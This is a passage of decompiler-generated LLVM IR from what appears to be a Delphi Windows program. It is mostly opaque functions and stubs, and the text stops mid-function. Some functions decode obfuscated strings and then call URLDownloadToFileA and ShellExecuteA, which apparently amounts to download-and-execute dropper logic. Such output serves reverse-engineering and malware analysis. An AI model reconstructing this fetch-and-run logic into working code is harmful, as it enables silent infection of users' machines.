define i32 @function_405fbc(i32 %arg1) local_unnamed_addr {
dec_label_pc_405fbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1255
}

define i32 @function_405fc0() local_unnamed_addr {
dec_label_pc_405fc0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a6c8, align 4, !insn.addr !1256
  %2 = add i32 %1, -1, !insn.addr !1256
  store i32 %2, i32* @global_var_40a6c8, align 4, !insn.addr !1256
  ret i32 %0, !insn.addr !1257
}

define i32 @function_405fc8() local_unnamed_addr {
dec_label_pc_405fc8:
  %eax.0.reg2mem = alloca i32, !insn.addr !1258
  %0 = call i32 @function_40603c(), !insn.addr !1259
  %1 = load i32, i32* @global_var_40912c, align 4
  %2 = icmp eq i32 %1, 0, !insn.addr !1260
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1261
  br i1 %2, label %dec_label_pc_405ffc, label %dec_label_pc_405fda, !insn.addr !1261

dec_label_pc_405fda:                              ; preds = %dec_label_pc_405fc8
  %3 = load i32, i32* inttoptr (i32 4231508 to i32*), align 4, !insn.addr !1262
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1263
  %5 = load i32, i32* %4, align 4, !insn.addr !1263
  %6 = icmp eq i32 %5, 0, !insn.addr !1263
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1264
  br i1 %6, label %dec_label_pc_405ffc, label %dec_label_pc_405fe4, !insn.addr !1264

dec_label_pc_405fe4:                              ; preds = %dec_label_pc_405fda
  call void @PostQuitMessage(i32 66), !insn.addr !1265
  %7 = call i32 @function_4043d4(i32 66), !insn.addr !1266
  unreachable, !insn.addr !1266

dec_label_pc_405ffc:                              ; preds = %dec_label_pc_405fda, %dec_label_pc_405fc8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1267
}

define i32 @function_40600c() local_unnamed_addr {
dec_label_pc_40600c:
  %0 = load i32, i32* @global_var_409104, align 4, !insn.addr !1268
  %1 = icmp eq i32 %0, 0, !insn.addr !1268
  br i1 %1, label %dec_label_pc_40601a, label %dec_label_pc_406015, !insn.addr !1269

dec_label_pc_406015:                              ; preds = %dec_label_pc_40600c
  %2 = call i32 @function_40603c(), !insn.addr !1270
  br label %dec_label_pc_40601a, !insn.addr !1270

dec_label_pc_40601a:                              ; preds = %dec_label_pc_406015, %dec_label_pc_40600c
  %3 = load i32, i32* inttoptr (i32 4231496 to i32*), align 8, !insn.addr !1271
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1272
  %5 = load i32, i32* %4, align 4, !insn.addr !1272
  %6 = mul i32 %5, 1000, !insn.addr !1272
  %7 = call i32 @SetTimer(i32* inttoptr (i32 4218824 to i32*), i32 %6, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1273
  store i32 %7, i32* @global_var_409104, align 4, !insn.addr !1274
  ret i32 %7, !insn.addr !1275
}

define i32 @function_40603c() local_unnamed_addr {
dec_label_pc_40603c:
  %.reg2mem = alloca i32, !insn.addr !1276
  %0 = load i32, i32* @global_var_409104, align 4, !insn.addr !1276
  %1 = icmp eq i32 %0, 0, !insn.addr !1276
  store i32 %0, i32* %.reg2mem, !insn.addr !1277
  br i1 %1, label %2, label %dec_label_pc_406045, !insn.addr !1277

; <label>:2:                                      ; preds = %dec_label_pc_40603c
  %3 = call i32 @function_406059(), !insn.addr !1277
  %.pre = load i32, i32* @global_var_409104, align 4
  store i32 %.pre, i32* %.reg2mem, !insn.addr !1277
  br label %dec_label_pc_406045, !insn.addr !1277

dec_label_pc_406045:                              ; preds = %2, %dec_label_pc_40603c
  %.reload = load i32, i32* %.reg2mem, !insn.addr !1278
  ret i32 %.reload, !insn.addr !1279
}

define i32 @function_406059() local_unnamed_addr {
dec_label_pc_406059:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1280
}

define i32 @function_40605c() local_unnamed_addr {
dec_label_pc_40605c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @function_405f80(i32 %0), !insn.addr !1281
  ret i32 %1, !insn.addr !1282
}

define i32 @function_406068() local_unnamed_addr {
dec_label_pc_406068:
  %0 = load i32, i32* @global_var_409108, align 4, !insn.addr !1283
  %1 = icmp eq i32 %0, 0, !insn.addr !1283
  br i1 %1, label %dec_label_pc_406076, label %dec_label_pc_406071, !insn.addr !1284

dec_label_pc_406071:                              ; preds = %dec_label_pc_406068
  %2 = call i32 @function_406090(), !insn.addr !1285
  br label %dec_label_pc_406076, !insn.addr !1285

dec_label_pc_406076:                              ; preds = %dec_label_pc_406071, %dec_label_pc_406068
  %3 = call i32 @SetTimer(i32* inttoptr (i32 4218972 to i32*), i32 5266, i32 0, void (i32*, i32, i32, i32)* null), !insn.addr !1286
  store i32 %3, i32* @global_var_409108, align 4, !insn.addr !1287
  ret i32 %3, !insn.addr !1288
}

define i32 @function_406090() local_unnamed_addr {
dec_label_pc_406090:
  %0 = load i32, i32* @global_var_409108, align 4, !insn.addr !1289
  ret i32 %0, !insn.addr !1290
}

define i32 @function_4060b0() local_unnamed_addr {
dec_label_pc_4060b0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1291
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1291
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1291
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1292
  %2 = load i32, i32* @global_var_40a6cc, align 4, !insn.addr !1293
  %3 = add i32 %2, 1, !insn.addr !1293
  store i32 %3, i32* @global_var_40a6cc, align 4, !insn.addr !1293
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1294
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1295
  ret i32 0, !insn.addr !1296
}

define i32 @function_4060d5() local_unnamed_addr {
dec_label_pc_4060d5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1297
  ret i32 %0, !insn.addr !1297
}

define i32 @function_4060da() local_unnamed_addr {
dec_label_pc_4060da:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1298
}

define i32 @function_4060dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4060dc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1299
}

define i32 @function_4060e0() local_unnamed_addr {
dec_label_pc_4060e0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a6cc, align 4, !insn.addr !1300
  %2 = add i32 %1, -1, !insn.addr !1300
  store i32 %2, i32* @global_var_40a6cc, align 4, !insn.addr !1300
  ret i32 %0, !insn.addr !1301
}

define i32 @function_4060e8() local_unnamed_addr {
dec_label_pc_4060e8:
  %0 = call i32 @URLDownloadToFileA.11(), !insn.addr !1302
  ret i32 %0, !insn.addr !1302
}

define i32 @function_4060f0() local_unnamed_addr {
dec_label_pc_4060f0:
  %esi.0.reg2mem = alloca i32, !insn.addr !1303
  %ebx.0.reg2mem = alloca i32, !insn.addr !1303
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !1304
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !1305
  store i32 %2, i32* %stack_var_-32, align 4, !insn.addr !1305
  %3 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1305
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !1306
  %4 = call i32 @function_4034c8(), !insn.addr !1307
  %5 = call i32 @"@LStrSetLength"(), !insn.addr !1308
  %6 = call i32 @function_4034c8(), !insn.addr !1309
  %7 = icmp slt i32 %6, 1
  store i32 1, i32* %ebx.0.reg2mem, !insn.addr !1310
  store i32 %6, i32* %esi.0.reg2mem, !insn.addr !1310
  br i1 %7, label %dec_label_pc_406166, label %dec_label_pc_406136, !insn.addr !1310

dec_label_pc_406136:                              ; preds = %dec_label_pc_4060f0, %dec_label_pc_406162
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %ebx.0.reload, -1
  %9 = add i32 %8, %0, !insn.addr !1311
  %10 = inttoptr i32 %9 to i8*, !insn.addr !1311
  %11 = load i8, i8* %10, align 1, !insn.addr !1311
  %12 = icmp eq i8 %11, 61, !insn.addr !1311
  %13 = icmp eq i1 %12, false, !insn.addr !1312
  %14 = call i32 @function_403720()
  br i1 %13, label %dec_label_pc_40614e, label %dec_label_pc_406140, !insn.addr !1312

dec_label_pc_406140:                              ; preds = %dec_label_pc_406136
  %15 = add i32 %14, %8, !insn.addr !1313
  %16 = inttoptr i32 %15 to i8*, !insn.addr !1313
  store i8 46, i8* %16, align 1, !insn.addr !1313
  br label %dec_label_pc_406162, !insn.addr !1314

dec_label_pc_40614e:                              ; preds = %dec_label_pc_406136
  %17 = load i8, i8* %10, align 1, !insn.addr !1315
  %18 = add i8 %17, -1, !insn.addr !1316
  %19 = add i32 %14, %8, !insn.addr !1317
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1317
  store i8 %18, i8* %20, align 1, !insn.addr !1317
  br label %dec_label_pc_406162, !insn.addr !1317

dec_label_pc_406162:                              ; preds = %dec_label_pc_40614e, %dec_label_pc_406140
  %21 = add i32 %ebx.0.reload, 1, !insn.addr !1318
  %22 = add i32 %esi.0.reload, -1, !insn.addr !1319
  %23 = icmp eq i32 %22, 0, !insn.addr !1319
  %24 = icmp eq i1 %23, false, !insn.addr !1320
  store i32 %21, i32* %ebx.0.reg2mem, !insn.addr !1320
  store i32 %22, i32* %esi.0.reg2mem, !insn.addr !1320
  br i1 %24, label %dec_label_pc_406136, label %dec_label_pc_406166, !insn.addr !1320

dec_label_pc_406166:                              ; preds = %dec_label_pc_406162, %dec_label_pc_4060f0
  %25 = load i32, i32* %stack_var_-32, align 4, !insn.addr !1321
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1322
  %26 = call i32 @"@LStrClr"(), !insn.addr !1323
  ret i32 %26, !insn.addr !1324
}

define i32 @function_40617c() local_unnamed_addr {
dec_label_pc_40617c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1325
  ret i32 %0, !insn.addr !1325
}

define i32 @function_406181() local_unnamed_addr {
dec_label_pc_406181:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1326
}

define i32 @function_406183(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_406183:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1327
}

define i32 @function_40618c() local_unnamed_addr {
dec_label_pc_40618c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @"@Str0Long"(i32 %1, i32 %0), !insn.addr !1328
  %3 = call i32 @"@PStrNCpy"(), !insn.addr !1329
  %4 = call i32 @"@LStrFromString"(), !insn.addr !1330
  ret i32 %4, !insn.addr !1331
}

define i32 @function_4061c4() local_unnamed_addr {
dec_label_pc_4061c4:
  %ecx.0.reg2mem = alloca i32, !insn.addr !1332
  %esp.0.reg2mem = alloca i32, !insn.addr !1332
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1332
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1333
  store i32 5, i32* %ecx.0.reg2mem, !insn.addr !1333
  br label %dec_label_pc_4061cc, !insn.addr !1333

dec_label_pc_4061cc:                              ; preds = %dec_label_pc_4061cc, %dec_label_pc_4061c4
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1334
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1334
  store i32 0, i32* %2, align 4, !insn.addr !1334
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1335
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1335
  store i32 0, i32* %4, align 4, !insn.addr !1335
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1336
  %6 = icmp eq i32 %5, 0, !insn.addr !1336
  %7 = icmp eq i1 %6, false, !insn.addr !1337
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1337
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1337
  br i1 %7, label %dec_label_pc_4061cc, label %dec_label_pc_4061d3, !insn.addr !1337

dec_label_pc_4061d3:                              ; preds = %dec_label_pc_4061cc
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1338
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1338
  store i32 0, i32* %9, align 4, !insn.addr !1338
  %10 = add i32 %esp.0.reload, -16, !insn.addr !1339
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1339
  %12 = add i32 %esp.0.reload, -20, !insn.addr !1340
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1340
  store i32 %0, i32* %13, align 4, !insn.addr !1340
  %14 = add i32 %esp.0.reload, -24, !insn.addr !1341
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1341
  store i32 4219659, i32* %15, align 4, !insn.addr !1341
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1342
  %17 = add i32 %esp.0.reload, -28, !insn.addr !1342
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1342
  store i32 %16, i32* %18, align 4, !insn.addr !1342
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1343
  %19 = call i32 @"@LStrFromPChar"(), !insn.addr !1344
  %20 = call i32 @function_4060f0(), !insn.addr !1345
  %21 = call i32 @function_4036c8(), !insn.addr !1346
  %22 = call i32 @"@LStrFromPChar"(), !insn.addr !1347
  %23 = add i32 %esp.0.reload, -32, !insn.addr !1348
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1348
  %25 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1348
  store i32 %25, i32* %24, align 4, !insn.addr !1348
  %26 = call i32 @"@LStrCopy"(), !insn.addr !1349
  %27 = call i32 @"@LStrDelete"(), !insn.addr !1350
  %28 = add i32 %esp.0.reload, -36, !insn.addr !1351
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1351
  %30 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1351
  store i32 %30, i32* %29, align 4, !insn.addr !1351
  %31 = call i32 @function_4034c8(), !insn.addr !1352
  %32 = call i32 @"@LStrCopy"(), !insn.addr !1353
  %33 = add i32 %esp.0.reload, -40, !insn.addr !1354
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1354
  store i32 ptrtoint ([6 x i8]* @global_var_406320 to i32), i32* %34, align 4, !insn.addr !1354
  %35 = call i32 @function_40618c(), !insn.addr !1355
  %36 = add i32 %esp.0.reload, -44, !insn.addr !1356
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1356
  %38 = add i32 %esp.0.reload, -48, !insn.addr !1357
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1357
  store i32 ptrtoint (i32* @global_var_406330 to i32), i32* %39, align 4, !insn.addr !1357
  %40 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1358
  %41 = add i32 %esp.0.reload, -52, !insn.addr !1358
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1358
  store i32 %40, i32* %42, align 4, !insn.addr !1358
  %43 = call i32 @"@LStrCatN"(), !insn.addr !1359
  %44 = add i32 %esp.0.reload, -56, !insn.addr !1360
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1360
  store i32 0, i32* %45, align 4, !insn.addr !1360
  %46 = add i32 %esp.0.reload, -60, !insn.addr !1361
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1361
  store i32 0, i32* %47, align 4, !insn.addr !1361
  %48 = call i32 @"@LStrCat3"(), !insn.addr !1362
  %49 = call i32 @function_4036c8(), !insn.addr !1363
  %50 = add i32 %esp.0.reload, -64, !insn.addr !1364
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1364
  store i32 %49, i32* %51, align 4, !insn.addr !1364
  %52 = call i32 @"@LStrFromPChar"(), !insn.addr !1365
  %53 = call i32 @function_4060f0(), !insn.addr !1366
  %54 = call i32 @function_4036c8(), !insn.addr !1367
  %55 = add i32 %esp.0.reload, -68, !insn.addr !1368
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1368
  store i32 %54, i32* %56, align 4, !insn.addr !1368
  %57 = add i32 %esp.0.reload, -72, !insn.addr !1369
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1369
  store i32 0, i32* %58, align 4, !insn.addr !1369
  %59 = call i32 @function_4060e8(), !insn.addr !1370
  %60 = add i32 %esp.0.reload, -76, !insn.addr !1371
  %61 = inttoptr i32 %60 to i32*, !insn.addr !1371
  store i32 1, i32* %61, align 4, !insn.addr !1371
  %62 = add i32 %esp.0.reload, -80, !insn.addr !1372
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1372
  store i32 0, i32* %63, align 4, !insn.addr !1372
  %64 = add i32 %esp.0.reload, -84, !insn.addr !1373
  %65 = inttoptr i32 %64 to i32*, !insn.addr !1373
  store i32 0, i32* %65, align 4, !insn.addr !1373
  %66 = call i32 @"@LStrCat3"(), !insn.addr !1374
  %67 = call i32 @function_4036c8(), !insn.addr !1375
  %68 = add i32 %esp.0.reload, -88, !insn.addr !1376
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1376
  store i32 %67, i32* %69, align 4, !insn.addr !1376
  %70 = add i32 %esp.0.reload, -92, !insn.addr !1377
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1377
  store i32 ptrtoint ([5 x i8]* @global_var_406340 to i32), i32* %71, align 4, !insn.addr !1377
  %72 = add i32 %esp.0.reload, -96, !insn.addr !1378
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1378
  store i32 0, i32* %73, align 4, !insn.addr !1378
  %74 = call i32* @ShellExecuteA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1379
  %75 = load i32, i32* %73, align 4, !insn.addr !1380
  call void @__writefsdword(i32 0, i32 %75), !insn.addr !1381
  store i32 4219666, i32* %69, align 4, !insn.addr !1382
  %76 = call i32 @"@LStrArrayClr"(), !insn.addr !1383
  ret i32 %76, !insn.addr !1384
}

define i32 @function_40630b() local_unnamed_addr {
dec_label_pc_40630b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1385
  ret i32 %0, !insn.addr !1385
}

define i32 @function_406310() local_unnamed_addr {
dec_label_pc_406310:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1386
}

define i32 @function_406312(i32 %arg1) local_unnamed_addr {
dec_label_pc_406312:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1387
}

define i32 @function_406337(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406337:
  %esp.1.reg2mem = alloca i32, !insn.addr !1388
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1388
  %ecx.0.reg2mem = alloca i32, !insn.addr !1388
  %esp.0.reg2mem = alloca i32, !insn.addr !1388
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %5 = add i32 %2, 1, !insn.addr !1388
  %6 = inttoptr i32 %2 to i32*, !insn.addr !1388
  store i32 %5, i32* %6, align 4, !insn.addr !1388
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !1389
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !1389
  %11 = add i8 %8, %10, !insn.addr !1389
  %12 = inttoptr i32 %9 to i8*, !insn.addr !1389
  store i8 %11, i8* %12, align 1, !insn.addr !1389
  %13 = add i32 %2, 58, !insn.addr !1390
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1390
  %15 = load i8, i8* %14, align 1, !insn.addr !1390
  %16 = load i32, i32* %eax, align 4, !insn.addr !1390
  %17 = udiv i32 %16, 256, !insn.addr !1390
  %18 = trunc i32 %17 to i8, !insn.addr !1390
  %19 = add i8 %15, %18, !insn.addr !1390
  store i8 %19, i8* %14, align 1, !insn.addr !1390
  %20 = add i32 %0, 112, !insn.addr !1391
  %21 = inttoptr i32 %20 to i8*, !insn.addr !1391
  %22 = load i8, i8* %21, align 1, !insn.addr !1391
  %23 = trunc i32 %4 to i8, !insn.addr !1391
  %24 = add i8 %22, %23, !insn.addr !1391
  store i8 %24, i8* %21, align 1, !insn.addr !1391
  %25 = trunc i32 %3 to i16, !insn.addr !1392
  %26 = call i8 @__readgsbyte(i32 %1), !insn.addr !1392
  call void @__asm_outsb(i16 %25, i8 %26), !insn.addr !1392
  %27 = load i8, i8* %7, align 4, !insn.addr !1393
  %28 = load i32, i32* %eax, align 4
  %29 = trunc i32 %28 to i8, !insn.addr !1393
  %30 = add i8 %27, %29, !insn.addr !1393
  %31 = inttoptr i32 %28 to i8*, !insn.addr !1393
  store i8 %30, i8* %31, align 1, !insn.addr !1393
  %32 = load i8, i8* %7, align 4, !insn.addr !1394
  %33 = load i32, i32* %eax, align 4
  %34 = trunc i32 %33 to i8, !insn.addr !1394
  %35 = add i8 %32, %34, !insn.addr !1394
  %36 = inttoptr i32 %33 to i8*, !insn.addr !1394
  store i8 %35, i8* %36, align 1, !insn.addr !1394
  %37 = ptrtoint i32* %stack_var_0 to i32, !insn.addr !1395
  store i32 %37, i32* %esp.0.reg2mem, !insn.addr !1396
  store i32 13, i32* %ecx.0.reg2mem, !insn.addr !1396
  br label %dec_label_pc_406350, !insn.addr !1396

dec_label_pc_406350:                              ; preds = %dec_label_pc_406350, %dec_label_pc_406337
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %38 = add i32 %esp.0.reload, -4, !insn.addr !1397
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1397
  store i32 0, i32* %39, align 4, !insn.addr !1397
  %40 = add i32 %esp.0.reload, -8, !insn.addr !1398
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1398
  store i32 0, i32* %41, align 4, !insn.addr !1398
  %42 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1399
  %43 = icmp eq i32 %42, 0, !insn.addr !1399
  %44 = icmp eq i1 %43, false, !insn.addr !1400
  store i32 %40, i32* %esp.0.reg2mem, !insn.addr !1400
  store i32 %42, i32* %ecx.0.reg2mem, !insn.addr !1400
  br i1 %44, label %dec_label_pc_406350, label %dec_label_pc_406357, !insn.addr !1400

dec_label_pc_406357:                              ; preds = %dec_label_pc_406350
  %45 = add i32 %esp.0.reload, -12, !insn.addr !1401
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1401
  store i32 0, i32* %46, align 4, !insn.addr !1401
  %47 = add i32 %esp.0.reload, -20, !insn.addr !1402
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1402
  store i32 %37, i32* %48, align 4, !insn.addr !1402
  %49 = add i32 %esp.0.reload, -24, !insn.addr !1403
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1403
  store i32 4220396, i32* %50, align 4, !insn.addr !1403
  %51 = call i32 @__readfsdword(i32 0), !insn.addr !1404
  %52 = add i32 %esp.0.reload, -28, !insn.addr !1404
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1404
  store i32 %51, i32* %53, align 4, !insn.addr !1404
  call void @__writefsdword(i32 0, i32 %52), !insn.addr !1405
  %54 = call i32 @"@LStrPos"(), !insn.addr !1406
  %55 = add i32 %esp.0.reload, -32, !insn.addr !1407
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1407
  %57 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1407
  store i32 %57, i32* %56, align 4, !insn.addr !1407
  %58 = call i32 @"@LStrCopy"(), !insn.addr !1408
  %59 = add i32 %esp.0.reload, -36, !insn.addr !1409
  %60 = inttoptr i32 %59 to i32*
  %61 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1409
  store i32 %61, i32* %60, align 4, !insn.addr !1409
  %62 = call i32 @function_4034c8(), !insn.addr !1410
  %63 = call i32 @"@LStrCopy"(), !insn.addr !1411
  %64 = add i32 %arg1, -1, !insn.addr !1412
  store i32 %64, i32* %eax, align 4, !insn.addr !1412
  store i32* %60, i32** %.pre-phi.reg2mem
  store i32 %59, i32* %esp.1.reg2mem
  switch i32 %arg1, label %dec_label_pc_4065d1 [
    i32 0, label %dec_label_pc_4063c9
    i32 1, label %dec_label_pc_406509
    i32 2, label %dec_label_pc_406577
  ]

dec_label_pc_4063c9:                              ; preds = %dec_label_pc_406357
  %65 = call i32 @function_4034c8(), !insn.addr !1413
  %66 = icmp slt i32 %65, 5, !insn.addr !1414
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1414
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1414
  br i1 %66, label %dec_label_pc_4065d1, label %dec_label_pc_4063da, !insn.addr !1414

dec_label_pc_4063da:                              ; preds = %dec_label_pc_4063c9
  %67 = call i32 @"@LStrFromPChar"(), !insn.addr !1415
  %68 = call i32 @function_4060f0(), !insn.addr !1416
  %69 = add i32 %esp.0.reload, -40, !insn.addr !1417
  %70 = inttoptr i32 %69 to i32*, !insn.addr !1417
  %71 = call i32 @"@LStrFromPChar"(), !insn.addr !1418
  %72 = call i32 @function_4060f0(), !insn.addr !1419
  %73 = add i32 %esp.0.reload, -44, !insn.addr !1420
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1420
  %75 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1421
  %76 = add i32 %esp.0.reload, -48, !insn.addr !1421
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1421
  store i32 %75, i32* %77, align 4, !insn.addr !1421
  %78 = add i32 %esp.0.reload, -52, !insn.addr !1422
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1422
  store i32 ptrtoint (i32* @global_var_406610 to i32), i32* %79, align 4, !insn.addr !1422
  %80 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1423
  %81 = add i32 %esp.0.reload, -56, !insn.addr !1423
  %82 = inttoptr i32 %81 to i32*, !insn.addr !1423
  store i32 %80, i32* %82, align 4, !insn.addr !1423
  %83 = call i32 @"@LStrCatN"(), !insn.addr !1424
  %84 = add i32 %esp.0.reload, -60, !insn.addr !1425
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1425
  %86 = add i32 %esp.0.reload, -64, !insn.addr !1426
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1426
  store i32 4220444, i32* %87, align 4, !insn.addr !1426
  %88 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1427
  %89 = add i32 %esp.0.reload, -68, !insn.addr !1427
  %90 = inttoptr i32 %89 to i32*, !insn.addr !1427
  store i32 %88, i32* %90, align 4, !insn.addr !1427
  %91 = add i32 %esp.0.reload, -72, !insn.addr !1428
  %92 = inttoptr i32 %91 to i32*, !insn.addr !1428
  store i32 4220460, i32* %92, align 4, !insn.addr !1428
  %93 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1429
  %94 = add i32 %esp.0.reload, -76, !insn.addr !1429
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1429
  store i32 %93, i32* %95, align 4, !insn.addr !1429
  %96 = add i32 %esp.0.reload, -80, !insn.addr !1430
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1430
  store i32 4220476, i32* %97, align 4, !insn.addr !1430
  %98 = call i32 @function_407494(), !insn.addr !1431
  %99 = add i32 %esp.0.reload, -84, !insn.addr !1432
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1432
  %101 = call i32 @"@LStrCatN"(), !insn.addr !1433
  %102 = add i32 %esp.0.reload, -88, !insn.addr !1434
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1434
  %104 = add i32 %esp.0.reload, -92, !insn.addr !1435
  %105 = inttoptr i32 %104 to i32*
  %106 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1435
  store i32 %106, i32* %105, align 4, !insn.addr !1435
  %107 = call i32 @"@LStrFromPChar"(), !insn.addr !1436
  %108 = call i32 @function_4060f0(), !insn.addr !1437
  %109 = call i32 @"@LStrPos"(), !insn.addr !1438
  %110 = add i32 %109, -1, !insn.addr !1439
  %111 = add i32 %esp.0.reload, -96, !insn.addr !1440
  %112 = inttoptr i32 %111 to i32*, !insn.addr !1440
  store i32 %110, i32* %112, align 4, !insn.addr !1440
  %113 = call i32 @"@LStrFromPChar"(), !insn.addr !1441
  %114 = call i32 @function_4060f0(), !insn.addr !1442
  %115 = call i32 @"@LStrCopy"(), !insn.addr !1443
  %116 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1444
  store i32 %116, i32* %112, align 4, !insn.addr !1445
  %117 = call i32 @"@LStrFromPChar"(), !insn.addr !1446
  %118 = call i32 @function_4060f0(), !insn.addr !1447
  %119 = add i32 %esp.0.reload, -100, !insn.addr !1448
  %120 = inttoptr i32 %119 to i32*, !insn.addr !1448
